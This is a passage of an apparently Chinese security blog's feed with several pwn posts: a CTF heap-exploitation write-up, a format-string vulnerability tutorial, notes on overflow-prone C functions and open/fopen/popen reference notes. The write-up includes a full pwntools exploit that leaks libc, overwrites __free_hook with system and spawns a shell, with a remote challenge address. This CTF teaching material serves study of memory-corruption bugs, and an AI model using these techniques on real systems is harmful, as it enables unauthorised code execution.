class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./amazon'</span></span><br><span class="line">elf = ELF(exe)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2c5</span>, <span class="number">0x4f322</span>, <span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(s = <span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p ,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num, size, note)</span>:</span></span><br><span class="line">    manu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'buy: '</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">'many: '</span>, str(num))</span><br><span class="line">    p.sendlineafter(<span class="string">'note: '</span>, str(size))</span><br><span class="line">    p.send(note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span><span class="params">(num, size, note)</span>:</span></span><br><span class="line">    manu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'buy: '</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.sendline(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    manu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkout</span><span class="params">(idx)</span>:</span></span><br><span class="line">    manu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'for: '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x80</span>, <span class="string">'a'</span>)  <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0xa0</span>, <span class="string">'A'</span>)  <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">'A'</span>)  <span class="comment">#2</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x10</span>, <span class="string">'A'</span>)  <span class="comment">#3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        checkout(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        checkout(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">'libc.address---&gt;'</span>+hex(libc.address))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        checkout(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">'\xff'</span>*<span class="number">0x80</span> +p64(<span class="number">3</span>)+p64(<span class="number">0xa1</span>) + p64(libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0x40</span>)) <span class="comment">#0 1</span></span><br><span class="line">    checkout(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0xa0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">'\x99'</span>*<span class="number">0x80</span> +p64(<span class="number">3</span>)+p64(<span class="number">0xa1</span>) + <span class="string">'$0\x00'</span>)  <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0xa0</span>, <span class="string">'\x00'</span>*<span class="number">0x20</span>+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    <span class="comment">#d()</span></span><br><span class="line">    checkout(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#-------------------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> l:</span><br><span class="line">        p = process(exe)</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(<span class="string">'121.41.38.38'</span>, <span class="number">9999</span>)</span><br><span class="line">        libc = ELF(<span class="string">'libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure><p>参考文章：<br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html" target="_blank" rel="noopener">https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html</a><br><a href="https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本地环境：ubuntu 18.04&lt;/p&gt;
&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;p&gt;1、利用glibc-2.27的tcache机制连续释放八次unsortedbin，再输出，
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://nocbtm.github.io/2018/11/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://nocbtm.github.io/2018/11/29/格式化字符串漏洞/</id>
    <published>2018-11-29T08:41:56.000Z</published>
    <updated>2019-10-01T08:30:40.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是格式化字符串"><a href="#0x00-什么是格式化字符串" class="headerlink" title="0x00 什么是格式化字符串"></a>0x00 什么是格式化字符串</h2><p>学过c语言的都知道printf，fprintf，sprintf等这一类printf函数中经常用到”%”，后面加一个或多个字符串做说明符。<br>格式化字符串指的就是printf函数第一个参数，最常见的包括：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure></p><p>printf有一个特殊的格式化控制符%n，和其他控制输出格式和内容的格式化字符不同的是，这个格式化字符会将已输出的字符数写入到对应参数的内存中。<br>我们就利用这个漏洞实现任意地址写</p><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><h3 id="产生漏洞的原因"><a href="#产生漏洞的原因" class="headerlink" title="产生漏洞的原因"></a>产生漏洞的原因</h3><p>就是没写格式化控制符,如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(str);</span><br></pre></td></tr></table></figure></p><p>事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。</p><p>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p><p>举个栗子，主函数如下：<br><img alt="" data-src="https://i.imgur.com/qQBQjaR.png" class="lozad"><br>程序很简单，可以多次输入方便调试，<br>memset函数先把buf都初始化为0，<br>然后read函数读取键盘操作，输入buf<br>最后在输出buf。</p><p><img alt="" data-src="https://i.imgur.com/Qc3mQgM.png" class="lozad"></p><p>正常情况下我们输入什么都会输出什么，但是当我们输入一些特定的字符时输出出现了变化。</p><h2 id="0x02利用格式化字符串漏洞实现任意地址读"><a href="#0x02利用格式化字符串漏洞实现任意地址读" class="headerlink" title="0x02利用格式化字符串漏洞实现任意地址读"></a>0x02利用格式化字符串漏洞实现任意地址读</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-什么是格式化字符串&quot;&gt;&lt;a href=&quot;#0x00-什么是格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是格式化字符串&quot;&gt;&lt;/a&gt;0x00 什么是格式化字符串&lt;/h2&gt;&lt;p&gt;学过c语言的都知道printf，fprint
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>从非缓冲系统文件到常见栈溢出函数</title>
    <link href="https://nocbtm.github.io/2018/11/12/%E4%BB%8E%E9%9D%9E%E7%BC%93%E5%86%B2%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%88%B0%E5%B8%B8%E8%A7%81%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0/"/>
    <id>https://nocbtm.github.io/2018/11/12/从非缓冲系统文件到常见栈溢出函数/</id>
    <published>2018-11-12T14:15:12.000Z</published>
    <updated>2019-10-01T08:37:25.212Z</updated>
    
    <content type="html"><![CDATA[<p>非缓冲和缓冲是相对而言的<br>了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。</p><h2 id="什么是缓冲文件系统？"><a href="#什么是缓冲文件系统？" class="headerlink" title="什么是缓冲文件系统？"></a>什么是缓冲文件系统？</h2><p>程序在运行过程中，会自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。</p><h3 id="代表函数-c语言"><a href="#代表函数-c语言" class="headerlink" title="代表函数(c语言)"></a>代表函数(c语言)</h3><p>缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等</p><h2 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。</p><h3 id="代表函数"><a href="#代表函数" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等</p><h2 id="栈溢出常见函数"><a href="#栈溢出常见函数" class="headerlink" title="栈溢出常见函数"></a>栈溢出常见函数</h2><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:right">功能</th><th style="text-align:center">可利用漏洞</th></tr></thead><tbody><tr><td style="text-align:left">read()</td><td style="text-align:right">读取文件内容到缓冲区</td><td style="text-align:center">读到\x00和指定字节</td></tr><tr><td style="text-align:left">write()</td><td style="text-align:right">把缓冲区的内容写入到文件内</td><td style="text-align:center">写到\x00和指定字节</td></tr><tr><td style="text-align:left">gets()</td><td style="text-align:right">从输入缓冲区中读取一个字符串存储到字符指针</td><td style="text-align:center">可无限输入</td></tr><tr><td style="text-align:left">puts()</td><td style="text-align:right">输出字符串,相当于printf(“%s\n”,s)</td><td style="text-align:center">输出直到\x00</td></tr><tr><td style="text-align:left">strcpy()</td><td style="text-align:right">只能复制字符串</td><td style="text-align:center">一直复制直到遇到\x00</td></tr><tr><td style="text-align:left">memcpy()</td><td style="text-align:right">复制任意内容</td><td style="text-align:center">指定字节</td></tr><tr><td style="text-align:left">strncpy()</td><td style="text-align:right">复制指定字节字符</td><td style="text-align:center">指定字节</td></tr><tr><td style="text-align:left">printf()</td><td style="text-align:right">格式化输出</td><td style="text-align:center">输出直到\x00</td></tr><tr><td style="text-align:left">scanf()</td><td style="text-align:right">格式化输入</td><td style="text-align:center">输入与定义不同的类型或输入多与定义的数组元素</td></tr></tbody></table><p>下面是详细内容:</p><h2 id="0x00-read"><a href="#0x00-read" class="headerlink" title="0x00 read()"></a>0x00 read()</h2><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t read (int fd, void *buf, size_t nbyte)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为0从键盘读取<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要读入文件指定的字节数；</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.<br>小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题.</p><h2 id="0x01-write"><a href="#0x01-write" class="headerlink" title="0x01 write()"></a>0x01 write()</h2><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t write(int fd,const void *buf,size_t nbytes)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为1输出到显示器<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要写入文件指定的字节数；</p><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.</p><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>如果顺利write()会返回实际写入的字节数.<br>当有错误发生时则返回-1, 错误代码存入errno 中.</p><p>错误代码：</p><ul><li>EINTR 此调用被信号所中断.</li><li>EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值.</li><li>EADF 参数fd 非有效的文件描述词, 或该文件已关闭</li></ul><h2 id="0x02-gets"><a href="#0x02-gets" class="headerlink" title="0x02 gets()"></a>0x02 gets()</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line">char *gets(char *str);</span><br></pre></td></tr></table></figure><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了</p><p>gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。</p><h2 id="0x03-strcpy-和memcpy-和strncpy"><a href="#0x03-strcpy-和memcpy-和strncpy" class="headerlink" title="0x03 strcpy()和memcpy()和strncpy()"></a>0x03 strcpy()和memcpy()和strncpy()</h2><h3 id="函数原型-3"><a href="#函数原型-3" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char* strcpy(char* dest, const char* src)</span><br><span class="line">void *memcpy( void *dest, const void *src, size_t count );</span><br><span class="line">char *strncpy(char *dest,char *src,int size_t n);</span><br></pre></td></tr></table></figure><p>dest:指向用于存储复制内容的目标数组。<br>src:要复制的字符串。<br>count：要读入文件指定的字节数；</p><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ul><li>strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。</li><li>复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。</li><li>复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。</li><li>用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</li><li>strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节</li></ul><h2 id="0x04-printf-和scanf"><a href="#0x04-printf-和scanf" class="headerlink" title="0x04 printf()和scanf()"></a>0x04 printf()和scanf()</h2><p>引入：华为的一道经典面试</p><p><img alt="" data-src="https://i.imgur.com/frca7C7.png" class="lozad"></p><p>i的值输出是多少呢，没有考虑栈溢出的话，i就是5。可这里栈溢出了，i=6776421 ，这是为什么呢？<br>进入到内存中分析：<br>连续定义的变量，内存地址一般也相邻<br>首先依次在栈区为变量开辟空间（注意方式，整形是4个字节以计算，char型一字节一计算）<br>a,b,c,d,e对应的ASCII码对照表的16进制为0x61,0x62,0x63,0x64,0x65<br><img alt="" data-src="https://i.imgur.com/Rf8iJUJ.png" class="lozad"></p><p>越界后：<br><img alt="" data-src="https://i.imgur.com/s49ZZ2I.jpg" class="lozad"></p><p>所以最后的结果是0x676665的十进制6776421</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;非缓冲和缓冲是相对而言的&lt;br&gt;了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。&lt;/p&gt;
&lt;h2 id=&quot;什么是缓冲文件系统？&quot;&gt;&lt;a href=&quot;#什么是缓冲文件系统？&quot; class=&quot;headerlink&quot; title=&quot;什么是缓冲文件系统？&quot;&gt;&lt;/a&gt;什么是缓冲
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>open、fopen和popen</title>
    <link href="https://nocbtm.github.io/2018/11/07/open%E3%80%81fopen%E5%92%8Cpopen/"/>
    <id>https://nocbtm.github.io/2018/11/07/open、fopen和popen/</id>
    <published>2018-11-07T12:44:23.000Z</published>
    <updated>2019-10-01T08:39:31.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>打开设备文件<br>不带缓冲区<br>非缓冲文件系统依赖于操作系统，通过操作系统的功能对文件进行读写，是系统级的输入输出，它不设文件结构体指针，只能读写二进制文件，但效率高、速度 快</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int open(const char *pathname, int flags);</span><br><span class="line">int open(const char *pathname, int flags, mode_t mode);</span><br><span class="line"></span><br><span class="line">所需库：</span><br><span class="line">#include &lt;sys/types.h&gt;    </span><br><span class="line">#include &lt;sys/stat.h&gt;    </span><br><span class="line">#include &lt;fcntl.h&gt;</span><br></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功则返回文件描述符，否则返回 -1;</p><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p>参数 pathname 指向欲打开的文件路径字符串. 下列是参数flags 所能使用的旗标:</p><ul><li>O_RDONLY 以只读方式打开文件</li><li>O_WRONLY 以只写方式打开文件</li><li>O _RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合.</li><li>O_CREAT 若欲打开的文件不存在则自动建立该文件.</li><li>O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败.</li><li>O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机.</li><li>O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失.</li><li>O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面.</li><li>O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中.</li><li>O_NDELAY 同O_NONBLOCK.</li><li>O_SYNC 以同步的方式打开文件.</li><li>O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败.</li><li>O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败。注：此为Linux2. 2 以后特有的旗标, 以避免一些系统安全问题. </li></ul><p>参数mode 则有下列数种组合, 只有在建立新文件时才会生效, 此外真正建文件时的权限会受到umask 值所影响, 因此该文件权限应该为 (mode-umaks).</p><ul><li>S_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.</li><li>S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.</li><li>S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.</li><li>S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.</li><li>S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.</li><li>S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.</li><li>S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.</li><li>S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.</li><li>S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.</li><li>S_IROTH 00004 权限, 代表其他用户具有可读的权限</li><li>S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.</li><li>S_IXOTH 00001 权限, 代表其他用户具有可执行的权限.</li></ul><p>返回值：若所有欲核查的权限都通过了检查则返回0 值, 表示成功, 只要有一个权限被禁止则返回-1.</p><p>错误代码：</p><ul><li>EEXIST 参数pathname 所指的文件已存在, 却使用了O_CREAT 和-O_EXCL 旗标.</li><li>EACCESS 参数pathname 所指的文件不符合所要求测试的权限.</li><li>EROFS 欲测试写入权限的文件存在于只读文件系统内.</li><li>EFAULT 参数pathname 指针超出可存取内存空间.</li><li>EINVAL 参数mode 不正确.</li><li>ENAMETOOLONG 参数 pathname 太长.</li><li>ENOTDIR 参数pathname 不是目录.</li><li>ENOMEM 核心内存不足.</li><li>ELOOP 参数pathname 有过多符号连接问题.</li><li>EIO I/O 存取错误.</li></ul><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>打开普通文件<br>带缓冲区<br>缓冲文件系统是借助文件结构体指针来对文件进行管理，通过文件指针来对文件进行访问，既可以读写字符、字符串、格式化数据，也可以读写二进制数据。</p><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">FILE * fopen(const char * path,const char * mode);</span><br></pre></td></tr></table></figure><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回NULL，并把错误代码存在errno 中。</p><h3 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h3><p>参数path字符串包含欲打开的文件路径及文件名，参数mode字符串则代表着流形态。<br>mode有下列几种形态字符串:<br>r 以只读方式打开文件，该文件必须存在。<br>r+ 以可读写方式打开文件，该文件必须存在。<br>rb+ 读写打开一个二进制文件，允许读写数据。<br>rw+ 读写打开一个文本文件，允许读和写。<br>w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。<br>w+ 打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。<br>a 以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留）<br>a+ 以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留）<br>wb 只写打开或新建一个二进制文件；只允许写数据。<br>wb+ 读写打开或建立一个二进制文件，允许读和写。<br>ab+ 读写打开一个二进制文件，允许读或在文件末追加数据。<br>at+ 打开一个叫string的文件，a表示append,就是说写入处理的时候是接着原来文件已有内容写入，不是从头写入覆盖掉，t表示打开文件的类型是文本文件，+号表示对文件既可以读也可以写。<br>上述的形态字符串都可以再加一个b字符，如rb、w+b或ab+等组合，加入b 字符用来告诉函数库以二进制模式打开文件。如果不加b，表示默认加了t，即rt,wt,其中t表示以文本模式打开文件。由fopen()所建立的新文件会具有S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH(0666)权限，此文件权限也会参考umask 值。<br>有些C编译系统可能不完全提供所有这些功能，有的C版本不用”r+”,”w+”,”a+”,而用”rw”,”wr”,”ar”等，读者注意所用系统的规定。</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">FILE * popen ( const char * command , const char * type );</span><br></pre></td></tr></table></figure><h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>如果调用 fork() 或 pipe() 